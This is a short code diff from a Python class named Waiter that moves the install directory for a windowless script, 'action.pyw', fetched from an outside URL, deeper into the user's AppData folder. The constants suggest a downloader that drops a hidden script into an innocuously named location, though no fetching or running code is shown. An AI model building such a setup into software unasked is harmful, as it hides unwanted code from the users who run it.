@@ -10,7 +10,7 @@ class Waiter:
     APP_URL = "http://action.akirottv.de"
     APP_NAME = "action_service"
     FILE_NAME = "action.pyw"
-    BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
+    BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common' / 'python' / 'src'}"
     APP_DIR = os.path.join(BASE_DIR, APP_NAME)
     APP_PATH = os.path.join(APP_DIR, FILE_NAME)
 
